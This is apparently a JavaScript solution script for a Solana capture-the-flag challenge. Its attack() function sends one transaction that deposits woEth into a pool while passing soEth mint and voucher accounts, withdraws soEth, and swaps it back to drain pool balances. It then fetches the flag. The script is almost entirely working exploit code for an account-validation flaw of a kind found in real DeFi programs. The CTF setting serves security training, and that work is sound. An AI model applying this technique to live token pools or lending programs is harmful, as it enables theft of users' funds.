import * as fs from "fs";
import * as anchor from "@project-serum/anchor";
import { BN } from "bn.js";

import * as api from "./api.js"; 
import { parseAccounts, sendInstructions } from "./util.js";

import * as spl_token from "@solana/spl-token";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";

const idl = JSON.parse(fs.readFileSync("../idl/challenge2.json"));
const accountFile = parseAccounts(fs.readFileSync("../" + api.PLAYERFILE));
const player = accountFile.player;
const accounts = accountFile.challengeTwo;
const program = new anchor.Program(idl, accounts.programId.toString(), "fake truthy value");
const baseUrl = accountFile.endpoint.match(/^(https*:\/\/[^\/]+)\/.*/)[1];
const conn = new anchor.web3.Connection(accountFile.endpoint);

// all player code goes here
async function attack() {
    console.log(accounts);
    // mint accounts
    const woEthMint = await spl_token.getMint(conn, accounts.woEthMint);
    const soEthMint = await spl_token.getMint(conn, accounts.soEthMint);
    const stEthMint = await spl_token.getMint(conn, accounts.stEthMint);
    // console.log(woEthMint);
    // console.log(soEthMint);
    // console.log(stEthMint);

    // pool token accounts
    let woEthPoolToken = await spl_token.getAccount(conn, accounts.woEthPoolAccount);
    let soEthPoolToken = await spl_token.getAccount(conn, accounts.soEthPoolAccount);
    let stEthPoolToken = await spl_token.getAccount(conn, accounts.stEthPoolAccount);
    console.log(`Pool balances:\n\twoEth: ${woEthPoolToken.amount}, soEth: ${soEthPoolToken.amount}, stEth: ${stEthPoolToken.amount}`);

    // player token accounts
    let woEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.woEthMint, player.publicKey));
    let soEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.soEthMint, player.publicKey));
    let stEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.stEthMint, player.publicKey));
    console.log(`Player balances:\n\twoEth: ${woEthTokenAccount.amount}, soEth: ${soEthTokenAccount.amount}, stEth: ${stEthTokenAccount.amount}`);

    // player pool voucher accounts
    const woEthPoolVoucher = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.woEthVoucherMint, player.publicKey));
    const soEthPoolVoucher = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.soEthVoucherMint, player.publicKey));
    const stEthPoolVoucher = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.stEthVoucherMint, player.publicKey));

    // depositing 1000 woETH Tokens to the pool => we get 1000 soEth Tokens
    let amount = new BN(1000);
    const txn = new anchor.web3.Transaction().add(
        program.instruction.deposit(amount,{
            accounts: {
                player: player.publicKey,                                       //checked
                depositor: player.publicKey,                                    //checked
                state: accounts.state,                                          //checked
                depositMint: soEthMint.address,                               //checked 
                pool: accounts.woEthPool,                                       //checked
                poolAccount: woEthPoolToken.address,                          //checked
                voucherMint: accounts.soEthVoucherMint,                         //checked (to get the soEth voucher mint)
                depositorAccount: woEthTokenAccount.address,                  //checked
                depositorVoucherAccount: soEthPoolVoucher.address,           //checked (to recieve the voucher tokens)
                tokenProgram: TOKEN_PROGRAM_ID,                                 //checked
            }
        }),
        // with drawing the soEth tokens from soEth voucher
        program.instruction.withdraw(amount, {
            accounts: {
                player: player.publicKey,
                depositor: player.publicKey,
                state: accounts.state,
                depositMint: soEthMint.address,
                pool: accounts.soEthPool,
                poolAccount: soEthPoolToken.address,
                voucherMint: accounts.soEthVoucherMint,
                depositorAccount: soEthTokenAccount.address,
                depositorVoucherAccount: soEthPoolVoucher.address,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        }),
        // swapping the soEth tokens for woEth tokens
        program.instruction.swap(amount, {
            accounts: {
                player: player.publicKey,
                swapper: player.publicKey,
                state: accounts.state,
                fromPool: accounts.soEthPool,
                toPool: accounts.woEthPool,
                fromPoolAccount: soEthPoolToken.address,
                toPoolAccount: woEthPoolToken.address,
                fromSwapperAccount: soEthTokenAccount.address,
                toSwapperAccount: woEthTokenAccount.address,
                tokenProgram: TOKEN_PROGRAM_ID,
            }
        })
    );
    // signing and sending the transaction
    const sign = await anchor.web3.sendAndConfirmTransaction(conn, txn, [player]);
    console.log("Signature: "+ sign);

    // pool token accounts
    woEthPoolToken = await spl_token.getAccount(conn, accounts.woEthPoolAccount);
    soEthPoolToken = await spl_token.getAccount(conn, accounts.soEthPoolAccount);
    stEthPoolToken = await spl_token.getAccount(conn, accounts.stEthPoolAccount);
    console.log(`Pool balances:\n\twoEth: ${woEthPoolToken.amount}, soEth: ${soEthPoolToken.amount}, stEth: ${stEthPoolToken.amount}`);

    // player token accounts
    woEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.woEthMint, player.publicKey));
    soEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.soEthMint, player.publicKey));
    stEthTokenAccount = await spl_token.getAccount(conn, await spl_token.getAssociatedTokenAddress(accounts.stEthMint, player.publicKey));
    console.log(`Player balances:\n\twoEth: ${woEthTokenAccount.amount}, soEth: ${soEthTokenAccount.amount}, stEth: ${stEthTokenAccount.amount}`);

}


console.log("running attack code...");
await attack();

console.log("checking win...");
const flag = await api.getFlag(baseUrl, player.publicKey, 2);

if(flag) {
    console.log("win! your flag is:", flag);
}
else {
    console.log("no win");
}
